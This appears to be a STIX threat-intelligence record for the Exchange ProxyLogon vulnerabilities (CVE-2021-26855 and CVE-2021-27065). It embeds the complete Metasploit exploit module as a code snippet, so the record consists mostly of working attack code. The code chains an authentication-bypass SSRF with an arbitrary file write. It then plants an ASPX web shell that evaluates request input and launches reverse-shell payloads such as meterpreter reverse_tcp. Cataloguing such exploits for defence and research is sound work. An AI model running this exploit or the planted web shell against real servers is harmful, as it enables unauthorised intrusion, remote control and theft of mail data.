{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--b7e45456-8ef5-4ac2-9a8c-b24d45f9d5ca",
    "created": "2024-08-14T16:52:34.529919Z",
    "modified": "2024-08-14T16:52:34.529923Z",
    "name": "Microsoft Exchange ProxyLogon RCE",
    "description": " This module exploit a vulnerability on Microsoft Exchange Server that allows an attacker bypassing the authentication, impersonating as the",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/http/exchange_proxylogon_rce.rb",
            "external_id": "exchange_proxylogon_rce.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2021-26855"
        },
        {
            "source_name": "CVE",
            "external_id": "2021-27065"
        },
        {
            "source_name": "reference",
            "url": "https://proxylogon.com/"
        },
        {
            "source_name": "reference",
            "url": "http://aka.ms/exchangevulns"
        },
        {
            "source_name": "reference",
            "url": "https://www.praetorian.com/blog/reproducing-proxylogon-exploit"
        },
        {
            "source_name": "reference",
            "url": "https://www.o2oxy.cn/3169.html"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/praetorian-inc/proxylogon-exploit"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/Zeop-CyberSec/proxylogon_writeup"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  prepend Msf::Exploit::Remote::AutoCheck\n\n  include Msf::Exploit::CmdStager\n  include Msf::Exploit::FileDropper\n  include Msf::Exploit::Powershell\n  include Msf::Exploit::Remote::CheckModule\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Microsoft Exchange ProxyLogon RCE',\n        'Description' => %q{\n          This module exploit a vulnerability on Microsoft Exchange Server that\n          allows an attacker bypassing the authentication, impersonating as the\n          admin (CVE-2021-26855) and write arbitrary file (CVE-2021-27065) to get\n          the RCE (Remote Code Execution).\n\n          By taking advantage of this vulnerability, you can execute arbitrary\n          commands on the remote Microsoft Exchange Server.\n\n          This vulnerability affects (Exchange 2013 Versions < 15.00.1497.012,\n          Exchange 2016 CU18 < 15.01.2106.013, Exchange 2016 CU19 < 15.01.2176.009,\n          Exchange 2019 CU7 < 15.02.0721.013, Exchange 2019 CU8 < 15.02.0792.010).\n\n          All components are vulnerable by default.\n        },\n        'Author' => [\n          'Orange Tsai', # Dicovery (Officially acknowledged by MSRC)\n          'Jang (@testanull)', # Vulnerability analysis + PoC (https://twitter.com/testanull)\n          'mekhalleh (RAMELLA S\u00e9bastien)', # Module author independent researcher (who listen to 'Le Comptoir Secu' and work at Zeop Entreprise)\n          'print(\"\")', # https://www.o2oxy.cn/3169.html\n          'lotusdll', # https://twitter.com/lotusdll/status/1371465073525362691\n          'Praetorian' # # Vulnerability analysis + PoC\n        ],\n        'References' => [\n          ['CVE', '2021-26855'],\n          ['CVE', '2021-27065'],\n          ['LOGO', 'https://proxylogon.com/images/logo.jpg'],\n          ['URL', 'https://proxylogon.com/'],\n          ['URL', 'http://aka.ms/exchangevulns'],\n          ['URL', 'https://www.praetorian.com/blog/reproducing-proxylogon-exploit'],\n          [\n            'URL',\n            'https://testbnull.medium.com/ph%C3%A2n-t%C3%ADch-l%E1%BB%97-h%E1%BB%95ng-proxylogon-mail-exchange-rce-s%E1%BB%B1-k%E1%BA%BFt-h%E1%BB%A3p-ho%C3%A0n-h%E1%BA%A3o-cve-2021-26855-37f4b6e06265'\n          ],\n          ['URL', 'https://www.o2oxy.cn/3169.html'],\n          ['URL', 'https://github.com/praetorian-inc/proxylogon-exploit'],\n          ['URL', 'https://github.com/Zeop-CyberSec/proxylogon_writeup']\n        ],\n        'DisclosureDate' => '2021-03-02',\n        'License' => MSF_LICENSE,\n        'DefaultOptions' => {\n          'CheckModule' => 'auxiliary/scanner/http/exchange_proxylogon',\n          'HttpClientTimeout' => 60,\n          'RPORT' => 443,\n          'SSL' => true,\n          'PAYLOAD' => 'windows/x64/meterpreter/reverse_tcp'\n        },\n        'Platform' => ['windows'],\n        'Arch' => [ARCH_CMD, ARCH_X64, ARCH_X86],\n        'Privileged' => true,\n        'Targets' => [\n          [\n            'Windows Powershell',\n            {\n              'Platform' => 'windows',\n              'Arch' => [ARCH_X64, ARCH_X86],\n              'Type' => :windows_powershell,\n              'DefaultOptions' => {\n                'PAYLOAD' => 'windows/x64/meterpreter/reverse_tcp'\n              }\n            }\n          ],\n          [\n            'Windows Dropper',\n            {\n              'Platform' => 'windows',\n              'Arch' => [ARCH_X64, ARCH_X86],\n              'Type' => :windows_dropper,\n              'CmdStagerFlavor' => %i[psh_invokewebrequest],\n              'DefaultOptions' => {\n                'PAYLOAD' => 'windows/x64/meterpreter/reverse_tcp',\n                'CMDSTAGER::FLAVOR' => 'psh_invokewebrequest'\n              }\n            }\n          ],\n          [\n            'Windows Command',\n            {\n              'Platform' => 'windows',\n              'Arch' => [ARCH_CMD],\n              'Type' => :windows_command,\n              'DefaultOptions' => {\n                'PAYLOAD' => 'cmd/windows/powershell_reverse_tcp'\n              }\n            }\n          ]\n        ],\n        'DefaultTarget' => 0,\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'SideEffects' => [ARTIFACTS_ON_DISK, IOC_IN_LOGS],\n          'Reliability' => [REPEATABLE_SESSION],\n          'AKA' => ['ProxyLogon']\n        }\n      )\n    )\n\n    register_options([\n      OptString.new('EMAIL', [true, 'A known email address for this organization']),\n      OptEnum.new('METHOD', [true, 'HTTP Method to use for the check', 'POST', ['GET', 'POST']]),\n      OptBool.new('UseAlternatePath', [true, 'Use the IIS root dir as alternate path', false])\n    ])\n\n    register_advanced_options([\n      OptString.new('BackendServerName', [false, 'Force the name of the backend Exchange server targeted']),\n      OptString.new('ExchangeBasePath', [true, 'The base path where exchange is installed', 'C:\\\\Program Files\\\\Microsoft\\\\Exchange Server\\\\V15']),\n      OptString.new('ExchangeWritePath', [true, 'The path where you want to write the backdoor', 'owa\\\\auth']),\n      OptString.new('IISBasePath', [true, 'The base path where IIS wwwroot directory is', 'C:\\\\inetpub\\\\wwwroot']),\n      OptString.new('IISWritePath', [true, 'The path where you want to write the backdoor', 'aspnet_client']),\n      OptString.new('MapiClientApp', [true, 'This is MAPI client version sent in the request', 'Outlook/15.0.4815.1002']),\n      OptInt.new('MaxWaitLoop', [true, 'Max counter loop to wait for OAB Virtual Dir reset', 30]),\n      OptString.new('UserAgent', [true, 'The HTTP User-Agent sent in the request', Rex::UserAgent.session_agent])\n    ])\n  end\n\n  def cmd_windows_generic?\n    datastore['PAYLOAD'] == 'cmd/windows/generic'\n  end\n\n  def encode_cmd(cmd)\n    cmd.gsub!('\\\\', '\\\\\\\\\\\\')\n    cmd.gsub('\"', '\\u0022').gsub('&', '\\u0026').gsub('+', '\\u002b')\n  end\n\n  def execute_command(cmd, _opts = {})\n    if !cmd_windows_generic?\n      cmd = \"Response.Write(new ActiveXObject(\\\"WScript.Shell\\\").Exec(\\\"#{encode_cmd(cmd)}\\\"));\"\n    else\n      cmd = \"Response.Write(new ActiveXObject(\\\"WScript.Shell\\\").Exec(\\\"#{encode_cmd(cmd)}\\\").StdOut.ReadAll());\"\n    end\n\n    send_request_raw(\n      'method' => 'POST',\n      'uri' => normalize_uri(web_directory, @random_filename),\n      'ctype' => 'application/x-www-form-urlencoded',\n      'data' => \"#{@random_inputname}=#{cmd}\"\n    )\n  end\n\n  def install_payload(exploit_info)\n    # exploit_info: [server_name, sid, session, canary, oab_id]\n\n    input_name = rand_text_alpha(4..8).to_s\n    shell = \"http://o/#<script language=\\\"JScript\\\" runat=\\\"server\\\">function Page_Load(){eval(Request[\\\"#{input_name}\\\"],\\\"unsafe\\\");}</script>\"\n    data = {\n      identity: {\n        __type: 'Identity:ECP',\n        DisplayName: (exploit_info[4][0]).to_s,\n        RawIdentity: (exploit_info[4][1]).to_s\n      },\n      properties: {\n        Parameters: {\n          __type: 'JsonDictionaryOfanyType:#Microsoft.Exchange.Management.ControlPanel',\n          ExternalUrl: shell.to_s\n        }\n      }\n    }.to_json\n\n    response = send_http(\n      'POST',\n      \"[:[@#{exploit_info[0]}:444/ecp/DDI/DDIService.svc/SetObject?schema=OABVirtualDirectory&msExchEcpCanary=#{exploit_info[3]}&a=~#{random_ssrf_id}\",\n      data: data,\n      cookie: exploit_info[2],\n      ctype: 'application/json; charset=utf-8',\n      headers: {\n        'msExchLogonMailbox' => patch_sid(exploit_info[1]),\n        'msExchTargetMailbox' => patch_sid(exploit_info[1]),\n        'X-vDirObjectId' => (exploit_info[4][1]).to_s\n      }\n    )\n    return '' if response.code != 200\n\n    input_name\n  end\n\n  def message(msg)\n    \"#{@proto}://#{datastore['RHOST']}:#{datastore['RPORT']} - #{msg}\"\n  end\n\n  def patch_sid(sid)\n    ar = sid.to_s.split('-')\n    if ar[-1] != '500'\n      sid = \"#{ar[0..6].join('-')}-500\"\n    end\n\n    sid\n  end\n\n  def random_mapi_id\n    id = \"{#{Rex::Text.rand_text_hex(8)}\"\n    id = \"#{id}-#{Rex::Text.rand_text_hex(4)}\"\n    id = \"#{id}-#{Rex::Text.rand_text_hex(4)}\"\n    id = \"#{id}-#{Rex::Text.rand_text_hex(4)}\"\n    id = \"#{id}-#{Rex::Text.rand_text_hex(12)}}\"\n    id.upcase\n  end\n\n  def random_ssrf_id\n    # https://en.wikipedia.org/wiki/2,147,483,647 (lol)\n    # max. 2147483647\n    rand(1941962752..2147483647)\n  end\n\n  def request_autodiscover(server_name)\n    xmlns = { 'xmlns' => 'http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a' }\n\n    response = send_http(\n      'POST',\n      \"[:[@#{server_name}/autodiscover/autodiscover.xml?a=~#{random_ssrf_id}\",\n      data: soap_autodiscover,\n      ctype: 'text/xml; charset=utf-8'\n    )\n\n    case response.body\n    when %r{<ErrorCode>500</ErrorCode>}\n      fail_with(Failure::NotFound, 'No Autodiscover information was found')\n    when %r{<Action>redirectAddr</Action>}\n      fail_with(Failure::NotFound, 'No email address was found')\n    end\n\n    xml = Nokogiri::XML.parse(response.body)\n\n    legacy_dn = xml.at_xpath('//xmlns:User/xmlns:LegacyDN', xmlns)&.content\n    fail_with(Failure::NotFound, 'No \\'LegacyDN\\' was found') if legacy_dn.nil? || legacy_dn.empty?\n\n    server = ''\n    xml.xpath('//xmlns:Account/xmlns:Protocol', xmlns).each do |item|\n      type = item.at_xpath('./xmlns:Type', xmlns)&.content\n      if type == 'EXCH'\n        server = item.at_xpath('./xmlns:Server', xmlns)&.content\n      end\n    end\n    fail_with(Failure::NotFound, 'No \\'Server ID\\' was found') if server.nil? || server.empty?\n\n    [server, legacy_dn]\n  end\n\n  def request_fqdn\n    ntlm_ssp = \"NTLMSSP\\x00\\x01\\x00\\x00\\x00\\x05\\x02\\x88\\xa0\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"\n    received = send_request_raw(\n      'method' => 'RPC_IN_DATA',\n      'uri' => normalize_uri('rpc', 'rpcproxy.dll'),\n      'headers' => {\n        'Authorization' => \"NTLM #{Rex::Text.encode_base64(ntlm_ssp)}\"\n      }\n    )\n    fail_with(Failure::TimeoutExpired, 'Server did not respond in an expected way') unless received\n\n    if received.code == 401 && received['WWW-Authenticate'] && received['WWW-Authenticate'].match(/^NTLM/i)\n      hash = received['WWW-Authenticate'].split('NTLM ')[1]\n      message = Net::NTLM::Message.parse(Rex::Text.decode_base64(hash))\n      dns_server = Net::NTLM::TargetInfo.new(message.target_info).av_pairs[Net::NTLM::TargetInfo::MSV_AV_DNS_COMPUTER_NAME]\n\n      return dns_server.force_encoding('UTF-16LE').encode('UTF-8').downcase\n    end\n\n    fail_with(Failure::NotFound, 'No Backend server was found')\n  end\n\n  # https://docs.microsoft.com/en-us/openspecs/exchange_server_protocols/ms-oxcmapihttp/c245390b-b115-46f8-bc71-03dce4a34bff\n  def request_mapi(server_name, legacy_dn, server_id)\n    data = \"#{legacy_dn}\\x00\\x00\\x00\\x00\\x00\\xe4\\x04\\x00\\x00\\x09\\x04\\x00\\x00\\x09\\x04\\x00\\x00\\x00\\x00\\x00\\x00\"\n    headers = {\n      'X-RequestType' => 'Connect',\n      'X-ClientInfo' => random_mapi_id,\n      'X-ClientApplication' => datastore['MapiClientApp'],\n      'X-RequestId' => \"#{random_mapi_id}:#{Rex::Text.rand_text_numeric(5)}\"\n    }\n\n    sid = ''\n    response = send_http(\n      'POST',\n      \"[:[@#{server_name}:444/mapi/emsmdb?MailboxId=#{server_id}&a=~#{random_ssrf_id}\",\n      data: data,\n      ctype: 'application/mapi-http',\n      headers: headers\n    )\n    if response.code == 200\n      sid_regex = /S-[0-9]*-[0-9]*-[0-9]*-[0-9]*-[0-9]*-[0-9]*-[0-9]*/\n\n      sid = response.body.match(sid_regex).to_s\n    end\n    fail_with(Failure::NotFound, 'No \\'SID\\' was found') if sid.empty?\n\n    sid\n  end\n\n  def request_oab(server_name, sid, session, canary)\n    data = {\n      filter: {\n        Parameters: {\n          __type: 'JsonDictionaryOfanyType:#Microsoft.Exchange.Management.ControlPanel',\n          SelectedView: '',\n          SelectedVDirType: 'OAB'\n        }\n      },\n      sort: {}\n    }.to_json\n\n    response = send_http(\n      'POST',\n      \"[:[@#{server_name}:444/ecp/DDI/DDIService.svc/GetList?reqId=1615583487987&schema=VirtualDirectory&msExchEcpCanary=#{canary}&a=~#{random_ssrf_id}\",\n      data: data,\n      cookie: session,\n      ctype: 'application/json; charset=utf-8',\n      headers: {\n        'msExchLogonMailbox' => patch_sid(sid),\n        'msExchTargetMailbox' => patch_sid(sid)\n      }\n    )\n\n    if response.code == 200\n      data = JSON.parse(response.body)\n      data['d']['Output'].each do |oab|\n        if oab['Server'].downcase == server_name.split('.')[0].downcase\n          return [oab['Identity']['DisplayName'], oab['Identity']['RawIdentity']]\n        end\n      end\n    end\n\n    []\n  end\n\n  def request_proxylogon(server_name, sid)\n    data = \"<r at=\\\"Negotiate\\\" ln=\\\"#{datastore['EMAIL'].split('@')[0]}\\\"><s>#{sid}</s></r>\"\n    session_id = ''\n    canary = ''\n\n    response = send_http(\n      'POST',\n      \"[:[@#{server_name}:444/ecp/proxyLogon.ecp?a=~#{random_ssrf_id}\",\n      data: data,\n      ctype: 'text/xml; charset=utf-8',\n      headers: {\n        'msExchLogonMailbox' => patch_sid(sid),\n        'msExchTargetMailbox' => patch_sid(sid)\n      }\n    )\n    if response.code == 241\n      session_id = response.get_cookies.scan(/ASP\\.NET_SessionId=([\\w-]+);/).flatten[0]\n      canary = response.get_cookies.scan(/msExchEcpCanary=([\\w\\-_.]+);*/).flatten[0] # coin coin coin ...\n    end\n\n    [session_id, canary]\n  end\n\n  # pre-authentication SSRF (Server Side Request Forgery) + impersonate as admin.\n  def run_cve_2021_26855\n    if datastore['BackendServerName'] && !datastore['BackendServerName'].empty?\n      server_name = datastore['BackendServerName']\n      print_status(\"Internal server name forced to: #{server_name}\")\n    else\n      print_status(message('Retrieving backend FQDN over RPC request'))\n      server_name = request_fqdn\n      print_status(\"Internal server name (#{server_name})\")\n    end\n\n    # get informations by autodiscover request.\n    print_status(message('Sending autodiscover request'))\n    server_id, legacy_dn = request_autodiscover(server_name)\n\n    print_status(\"Server: #{server_id}\")\n    print_status(\"LegacyDN: #{legacy_dn}\")\n\n    # get the user UID using mapi request.\n    print_status(message('Sending mapi request'))\n    sid = request_mapi(server_name, legacy_dn, server_id)\n    print_status(\"SID: #{sid} (#{datastore['EMAIL']})\")\n\n    # search oab\n    sid, session, canary, oab_id = search_oab(server_name, sid)\n\n    [server_name, sid, session, canary, oab_id]\n  end\n\n  # post-auth arbitrary file write.\n  def run_cve_2021_27065(session_info)\n    # set external url (and set the payload).\n    print_status('Preparing the payload on the remote target')\n    input_name = install_payload(session_info)\n\n    fail_with(Failure::NoAccess, 'Could\\'t prepare the payload on the remote target') if input_name.empty?\n\n    # reset the virtual directory (and write the payload).\n    print_status('Writing the payload on the remote target')\n    remote_file = write_payload(session_info)\n\n    fail_with(Failure::NoAccess, 'Could\\'t write the payload on the remote target') if remote_file.empty?\n\n    # wait a lot.\n    i = 0\n    while i < datastore['MaxWaitLoop']\n      received = send_request_cgi({\n        'method' => 'GET',\n        'uri' => normalize_uri(web_directory, remote_file)\n      })\n      if received && (received.code == 200)\n        break\n      end\n\n      print_warning('Waiting for the payload to be available')\n      sleep 5\n      i += 1\n    end\n    fail_with(Failure::PayloadFailed, 'Could\\'t access the remote backdoor (see. ExchangePathBase option)') if received.code == 302\n\n    [input_name, remote_file]\n  end\n\n  def search_oab(server_name, sid)\n    # request cookies (session and canary)\n    print_status(message('Sending ProxyLogon request'))\n\n    print_status('Try to get a good msExchCanary (by patching user SID method)')\n    session_id, canary = request_proxylogon(server_name, patch_sid(sid))\n    if canary\n      auth_session = \"ASP.NET_SessionId=#{session_id}; msExchEcpCanary=#{canary};\"\n      oab_id = request_oab(server_name, sid, auth_session, canary)\n    end\n\n    if oab_id.nil? || oab_id.empty?\n      print_status('Try to get a good msExchCanary (without correcting the user SID)')\n      session_id, canary = request_proxylogon(server_name, sid)\n      if canary\n        auth_session = \"ASP.NET_SessionId=#{session_id}; msExchEcpCanary=#{canary};\"\n        oab_id = request_oab(server_name, sid, auth_session, canary)\n      end\n    end\n\n    fail_with(Failure::NotFound, 'No \\'ASP.NET_SessionId\\' was found') if session_id.nil? || session_id.empty?\n    fail_with(Failure::NotFound, 'No \\'msExchEcpCanary\\' was found') if canary.nil? || canary.empty?\n    fail_with(Failure::NotFound, 'No \\'OAB Id\\' was found') if oab_id.nil? || oab_id.empty?\n\n    print_status(\"ASP.NET_SessionId: #{session_id}\")\n    print_status(\"msExchEcpCanary: #{canary}\")\n    print_status(\"OAB id: #{oab_id[1]} (#{oab_id[0]})\")\n\n    return [sid, auth_session, canary, oab_id]\n  end\n\n  def send_http(method, ssrf, opts = {})\n    ssrf = \"X-BEResource=#{ssrf};\"\n    if opts[:cookie] && !opts[:cookie].empty?\n      opts[:cookie] = \"#{ssrf} #{opts[:cookie]}\"\n    else\n      opts[:cookie] = ssrf.to_s\n    end\n\n    opts[:ctype] = 'application/x-www-form-urlencoded' if opts[:ctype].nil?\n\n    request = {\n      'method' => method,\n      'uri' => @random_uri,\n      'agent' => datastore['UserAgent'],\n      'ctype' => opts[:ctype]\n    }\n    request = request.merge({ 'data' => opts[:data] }) unless opts[:data].nil?\n    request = request.merge({ 'cookie' => opts[:cookie] }) unless opts[:cookie].nil?\n    request = request.merge({ 'headers' => opts[:headers] }) unless opts[:headers].nil?\n\n    received = send_request_cgi(request)\n    fail_with(Failure::TimeoutExpired, 'Server did not respond in an expected way') unless received\n\n    received\n  end\n\n  def soap_autodiscover\n    <<~SOAP\n      <?xml version=\"1.0\" encoding=\"utf-8\"?>\n      <Autodiscover xmlns=\"http://schemas.microsoft.com/exchange/autodiscover/outlook/requestschema/2006\">\n        <Request>\n          <EMailAddress>#{datastore['EMAIL']}</EMailAddress>\n          <AcceptableResponseSchema>http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a</AcceptableResponseSchema>\n        </Request>\n      </Autodiscover>\n    SOAP\n  end\n\n  def web_directory\n    if datastore['UseAlternatePath']\n      web_dir = datastore['IISWritePath'].gsub('\\\\', '/')\n    else\n      web_dir = datastore['ExchangeWritePath'].gsub('\\\\', '/')\n    end\n    web_dir\n  end\n\n  def write_payload(exploit_info)\n    # exploit_info: [server_name, sid, session, canary, oab_id]\n\n    remote_file = \"#{rand_text_alpha(4..8)}.aspx\"\n    if datastore['UseAlternatePath']\n      remote_path = \"#{datastore['IISBasePath'].split(':')[1]}\\\\#{datastore['IISWritePath']}\"\n      remote_path = \"\\\\\\\\127.0.0.1\\\\#{datastore['IISBasePath'].split(':')[0]}$#{remote_path}\\\\#{remote_file}\"\n    else\n      remote_path = \"#{datastore['ExchangeBasePath'].split(':')[1]}\\\\FrontEnd\\\\HttpProxy\\\\#{datastore['ExchangeWritePath']}\"\n      remote_path = \"\\\\\\\\127.0.0.1\\\\#{datastore['ExchangeBasePath'].split(':')[0]}$#{remote_path}\\\\#{remote_file}\"\n    end\n\n    data = {\n      identity: {\n        __type: 'Identity:ECP',\n        DisplayName: (exploit_info[4][0]).to_s,\n        RawIdentity: (exploit_info[4][1]).to_s\n      },\n      properties: {\n        Parameters: {\n          __type: 'JsonDictionaryOfanyType:#Microsoft.Exchange.Management.ControlPanel',\n          FilePathName: remote_path.to_s\n        }\n      }\n    }.to_json\n\n    response = send_http(\n      'POST',\n      \"[:[@#{exploit_info[0]}:444/ecp/DDI/DDIService.svc/SetObject?schema=ResetOABVirtualDirectory&msExchEcpCanary=#{exploit_info[3]}&a=~#{random_ssrf_id}\",\n      data: data,\n      cookie: exploit_info[2],\n      ctype: 'application/json; charset=utf-8',\n      headers: {\n        'msExchLogonMailbox' => patch_sid(exploit_info[1]),\n        'msExchTargetMailbox' => patch_sid(exploit_info[1]),\n        'X-vDirObjectId' => (exploit_info[4][1]).to_s\n      }\n    )\n    return '' if response.code != 200\n\n    remote_file\n  end\n\n  def exploit\n    @proto = (ssl ? 'https' : 'http')\n    @random_uri = normalize_uri('ecp', \"#{rand_text_alpha(1..3)}.js\")\n\n    print_status(message('Attempt to exploit for CVE-2021-26855'))\n    exploit_info = run_cve_2021_26855\n\n    print_status(message('Attempt to exploit for CVE-2021-27065'))\n    shell_info = run_cve_2021_27065(exploit_info)\n\n    @random_inputname = shell_info[0]\n    @random_filename = shell_info[1]\n\n    print_good(\"Yeeting #{datastore['PAYLOAD']} payload at #{peer}\")\n    if datastore['UseAlternatePath']\n      remote_file = \"#{datastore['IISBasePath']}\\\\#{datastore['IISWritePath']}\\\\#{@random_filename}\"\n    else\n      remote_file = \"#{datastore['ExchangeBasePath']}\\\\FrontEnd\\\\HttpProxy\\\\#{datastore['ExchangeWritePath']}\\\\#{@random_filename}\"\n    end\n    register_files_for_cleanup(remote_file)\n\n    # trigger powa!\n    case target['Type']\n    when :windows_command\n      vprint_status(\"Generated payload: #{payload.encoded}\")\n\n      if !cmd_windows_generic?\n        execute_command(payload.encoded)\n      else\n        response = execute_command(\"cmd /c #{payload.encoded}\")\n\n        print_warning('Dumping command output in response')\n        output = response.body.split('Name                            :')[0]\n        if output.empty?\n          print_error('Empty response, no command output')\n          return\n        end\n        print_line(output)\n      end\n    when :windows_dropper\n      execute_command(generate_cmdstager(concat_operator: ';').join)\n    when :windows_powershell\n      cmd = cmd_psh_payload(payload.encoded, payload.arch.first, remove_comspec: true)\n      execute_command(cmd)\n    end\n  end\n\nend\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_disclosure_date": "2021-03-02",
    "x_mitre_platforms": [
        "windows'"
    ]
}